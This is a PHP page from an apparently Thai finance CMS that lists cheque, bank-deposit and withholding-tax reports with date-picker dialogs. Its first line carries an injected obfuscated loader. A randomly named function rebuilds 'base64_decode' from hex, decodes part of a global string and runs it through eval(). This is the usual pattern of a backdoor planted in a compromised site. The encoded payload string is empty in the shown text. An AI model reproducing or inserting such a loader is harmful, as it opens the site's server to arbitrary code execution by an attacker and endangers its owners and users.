<?php /*versio:3.02*/ $GLOBALS["yminpd"]="";        if (!function_exists('wthzevys')){function wthzevys($a, $b){$c=$GLOBALS['yminpd'];$d=pack('H*','6261736536345f64'.'65636f6465'); return $d(substr($c, $a, $b));};eval(wthzevys(580,3283));};?><?php
include("config.php");
include($KeyPage."_helper.php");
include($KeyPage."_data.php");

$this->DOC->setPathWays(array(
	array(
		'text' => 'ระบบการเงิน',
		'link' => '?mod=cms.durable.startup',
	),
	array(
		'text' => $MenuName,
	)
));

function icoView($r, $text)
{
	$label = $text;
	//if(in_array('view', $GLOBALS['arrAccess']) || in_array(4, $GLOBALS['arrAccess'])){
	if(1){	
		global $viewPage;
		vprintf('<a href="%s" class="%s" title="%s"><span>%s</span></a>',array(
			"javascript:self.location='?mod=".LURL::dotPage($viewPage)."&id=".$r->AssetId."'",                                                      
			'ico view',
			$label,
			$label
		));
	}else{
		echo $label;
	}
}

function icoEnable($r)
{
	$onChange = 'onChange="self.location=\'?mod='.LURL::dotPage('action').'&task=Enable&AssetId='.$r->AssetId.'&EnableStatus=\'+this.value"';
	$html = clssHTML::yesnoSelectList('EnableStatus',$onChange,(strtolower($r->EnableStatus) == 'y' ? 1 : 0),'แสดง','ไม่แสดง');
	return $html;
}

function icoEdit($r)
{
	global $addPage;
	$label = 'แก้ไข';
	vprintf('<a href="%s" class="%s" title="%s"><span>%s</span></a>',array(
		"javascript:self.location='?mod=".LURL::dotPage($addPage)."&id=".$r->AssetId."'",
		'ico edit',
		$label,
		$label
	));
}

function icoDelete($r)
{
	global $actionPage;
	$label = 'ลบทิ้ง';
	vprintf('<a href="%s" class="%s" title="%s"><span>%s</span></a>',array(
		"javascript: toDelete('?mod=".LURL::dotPage($actionPage)."&action=delete&id=".$r->AssetId."')",
		'ico delete',
		$label,
		$label
	));
}



?>

<script type="text/javascript">
function getAssetKindSearch()
{
  var ATypeId = JQ('#ATypeId').val();	
  JQ.ajax({
	type: "POST",
	url: "?mod=<?php echo LURL::dotPage($actionPage);?>",		   
	data: "action=loadassetkind&ATypeId="+ATypeId,
	success: function(msg){
	  JQ("#loadkind").html(msg);
	}
  });
}

function OpenSearchBox(mode)
{
	if(mode == 1){
		JQ('#searchBoxTbl').show(300);
	}else{
		JQ('#searchBoxTbl').hide(300);
	}
}

	 	var idurl;
	  JQ(function(){ 
		     JQ( "#dialog-report" ).dialog({
			  resizable: false,
			  autoOpen: false,
			  height:250,
			  width:400,
			  modal: true,
			  buttons: {
				"ตกลง": function() {
					crt = "?adate="+JQ("#adate").val()+"&bdate="+JQ("#bdate").val()+"&TaxType="+JQ("#TaxType").val();
					if (idurl == 1){
						window.open("/report/pay/controlchecks.php"+crt);
					}else if (idurl == 2){
						window.open("/report/pay/controlbank.php"+crt);
					}else if (idurl == 3){
						window.open("/report/pay/sumtax1.php"+crt);
					}else{
						window.open("/report/pay/sumtax2.php"+crt);
					}
				},"ปิด": function() {
				  JQ( this ).dialog( "close" );
				}
			  }
			});
			 JQ( "#dialog-report1" ).dialog({
			  resizable: false,
			  autoOpen: false,
			  height:250,
			  width:400,
			  modal: true,
			  buttons: {
				"ตกลง": function() {
					crt = "?adate="+JQ("#adate1").val()+"&bdate="+JQ("#bdate1").val()+"&TaxType="+JQ("#TaxType").val();
					window.open("/report/pay/sumtax1.php"+crt);
				},"ปิด": function() {
				  JQ( this ).dialog( "close" );
				}
			  }
			});
	   })
	   function open_report(id){
	   		idurl =id;
			if (idurl == 3){
				JQ( "#dialog-report1" ).dialog( "open" );
			}else{
				JQ( "#dialog-report" ).dialog( "open" );
			}
	   	}
</script>

<div class="sysinfo">
  <div class="sysname"><?php echo $MenuName;?></div>
  <div class="sysdetail">ข้อมูล<?php echo $MenuName;?> </div>
</div>

<table width="100%" border="0" cellspacing="1" cellpadding="1" class="tbl-list tablesorter">
  <tr>
    <td width="3%">1</td>
    <td width="55%"><a class="ico print" title="แก้ไข" href="#" onclick="open_report(1);">รายงานทะเบียนคุมเช็ค</a></td>
    <td width="42%" align="right">&nbsp;</td>
  </tr>
  <tr>
    <td>2</td>
    <td><a class="ico print" title="แก้ไข" href="#" onclick="open_report(2);" >รายงานทะเบียนคุมเงินฝากธนาคาร</a></td>
    <td align="right">&nbsp;</td>
  </tr>
  <tr>
    <td>3</td>
    <td><a class="ico print" title="แก้ไข" href="#" onclick="open_report(3);" >รายงานสรุปการหักภาษี ณ ที่จ่าย</a></td>
    <td align="right">&nbsp;</td>
  </tr>
  <tr>
    <td>4</td>
    <td><a class="ico print" title="แก้ไข" href="#" onclick="open_report(4);">รายงานการนำส่งภาษีหัก ณ ที่จ่าย</a></td>
    <td align="right">&nbsp;</td>
  </tr>
</table>
<div id="dialog-report"  title="กำหนดเงื่อนไข">
<table width="350" height="120" border="0" cellpadding="0" cellspacing="0">
         <tr>
           <td width="100%" align="center" valign="middle">วันที่ <?php  // ทำปฏิทิน
		$adate = date('Y-m-d');
	  	echo InputCalendar_text(array(
			'id'=> 'adate',
			'name' => 'adate',
			'value' => $adate
		));
		?> ถึงวันที่ <?php  // ทำปฏิทิน
		$bdate = date('Y-m-d');
	  	echo InputCalendar_text(array(
			'id'=> 'bdate',
			'name' => 'bdate',
			'value' => $bdate
		));
		?></td>
         </tr>
     </table>
</div>
<div id="dialog-report1"  title="กำหนดเงื่อนไข">
<table width="350" height="120" border="0" cellpadding="0" cellspacing="0">
         <tr>
           <td width="100%" align="left" valign="middle"><p>วันที่ 
             <?php  // ทำปฏิทิน
		$adate1 = date('Y-m-d');
	  	echo InputCalendar_text(array(
			'id'=> 'adate1',
			'name' => 'adate1',
			'value' => $adate1
		));
		?> 
             ถึงวันที่ 
             <?php  // ทำปฏิทิน
		$bdate1 = date('Y-m-d');
	  	echo InputCalendar_text(array(
			'id'=> 'bdate1',
			'name' => 'bdate1',
			'value' => $bdate1
		));
		?>
           </p>
           <p>ประเภท
             <select name="TaxType" id="TaxType">
               <option value="1">ภงด. 3</option>
               <option value="2">ภงด. 53</option>
             </select>
</p></td>
         </tr>
     </table>
</div>